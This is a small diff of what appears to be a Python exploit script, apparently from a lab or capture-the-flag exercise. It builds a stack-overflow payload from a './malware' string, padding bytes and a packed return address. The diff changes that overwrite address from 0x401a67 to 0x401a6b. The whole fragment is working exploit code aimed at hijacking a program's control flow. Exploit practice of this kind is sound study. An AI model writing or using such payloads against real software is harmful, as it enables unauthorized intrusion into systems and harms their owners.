@@ -8,6 +8,6 @@ p64 = lambda x: struct.pack("<Q", x)
 payload  = b"./malware\x00"     
 payload += b"A" * 6              
 payload += b"B" * 8             
-payload += p64(0x401a67)         
+payload += p64(0x401a6b)         
 
 sys.stdout.buffer.write(payload)
